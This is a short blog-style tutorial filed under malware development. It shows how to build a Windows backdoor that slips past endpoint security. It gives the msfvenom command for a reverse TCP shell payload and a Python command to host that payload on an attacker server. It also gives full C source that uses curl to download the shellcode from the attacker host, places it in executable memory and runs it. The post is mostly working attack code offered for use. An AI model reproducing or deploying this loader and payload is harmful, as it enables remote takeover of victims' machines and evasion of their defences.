Stealth Transfers: Bypassing Endpoint Security Using cURL

April 10, 2026
2 min
332 words
Categories: Malware Development
Tags: Shellcode Backdoor Evasion

Create C Shell Backdoor

First, we need to create a shell backdoor using msfvenom. We will create a reverse TCP shell that will connect back to our attacker machine. We can use the following command to create the payload:

cat.bin 
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.x.x lport=xxxx -f raw -o cat.bin
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.x.x lport=xxxx -f raw -o cat.bin

Hosting the Payload

Inside the attacker machine, open another terminal and use python to host the payload file (cat.bin).

TERMINAL 
python3 -m http.server 8080
python3 -m http.server 8080

Create the Evading Executable

Now it time to create the executable that will be used to download and execute the payload. We can use the following code to achieve this:

evade.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
int main()
{
    FILE *fpipe;
    char *command = "curl http://10.10.attacker.server:8080/cat.bin";
    char c = 0;
    unsigned char code[460];
    //payload size: 460 bytes
    int counter = 0;
if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }
while (fread(&c, sizeof c, 1, fpipe))
    {
        code[counter] = c;
        printf("%c", code[counter]);
        counter = counter + 1;
    }
pclose(fpipe);
    
    void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 memcpy(exec, code, sizeof code);
 ((void(*)())exec)();
 return 0;
}

Compile the Executable

To compile, we can use various tools, but for me, i will use Embarcadero Dev-C++ to create the executable. After compiling, we can run the executable and it will execute the shellcode in the same process.
